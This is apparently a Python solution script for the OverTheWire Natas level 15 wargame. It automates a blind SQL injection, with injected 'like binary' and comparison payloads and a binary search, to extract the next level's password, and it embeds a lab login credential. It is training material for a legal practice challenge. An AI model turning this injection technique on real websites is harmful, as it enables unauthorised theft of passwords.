#! /usr/bin/python

import requests
from bs4 import BeautifulSoup

url = 'http://natas15.natas.labs.overthewire.org'
auth = ('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')

characters = [chr(x) for x in range(48,58)]+[chr(x) for x in range(65,91)]+[chr(x) for x in range(97,123)]
lt_inj = 'natas16" and password < binary "{}" -- "'
eq_inj = 'natas16" and password like binary "{}" -- "'

#BeautifulSoup(response.text).find(id='content').contents[0]
target = '\r\nThis user exists.'

def hit(password):
  res = requests.post(url,auth=auth,data={'username':eq_inj.format(password)})
  while res.status_code >= 500:
    res = requests.post(url,auth=auth,data={'username':eq_inj.format(password)})
    print('Server error, code {}'.format(res.status_code))
  if res.status_code == 200:
    return BeautifulSoup(res.text, 'lxml').find(id='content').contents[0] == target
  else:
    print('ERROR, CODE {}'.format(res.status_code))
    exit()

def lessThan(password):
  res = requests.post(url,auth=auth,data={'username':lt_inj.format(password)})
  while res.status_code >= 500:
    res = requests.post(url,auth=auth,data={'username':lt_inj.format(password)})
    print('Server error, code {}'.format(res.status_code))
  if res.status_code == 200:
    return BeautifulSoup(res.text, 'lxml').find(id='content').contents[0] == target
  else:
    print('ERROR, CODE {}'.format(res.status_code))
    exit()

def binary_search(pasword):
  minimum = 0
  maximum = len(characters)
  mid = int((maximum+minimum)/2)
  
  stop = hit(password+characters[mid]+'%')
  while stop is not True:
    print(characters[mid], end=' ', flush=True)
    if mid == minimum or mid == maximum or maximum <= minimum:
      break
    if lessThan(password+characters[mid]+'%'): 
      maximum = mid
    else:
      minimum = mid
    mid = int((maximum+minimum)/2)
    stop = hit(password+characters[mid]+'%')
  print()
  return password + characters[mid]

def linear_search(password):
  for c in characters:
    print(c, end=' ', flush=True)
    if hit(password+c+'%'):
      return password+c
  exit()

password = ''
for i in range(32):

  for j in range(32):
    if j < len(password):
      print(password[j], end='')
    else:
      print('_', end='')

  print('\n{})'.format(f'{i+1}'.zfill(2)), end='')
  password = binary_search(password)
print(password)
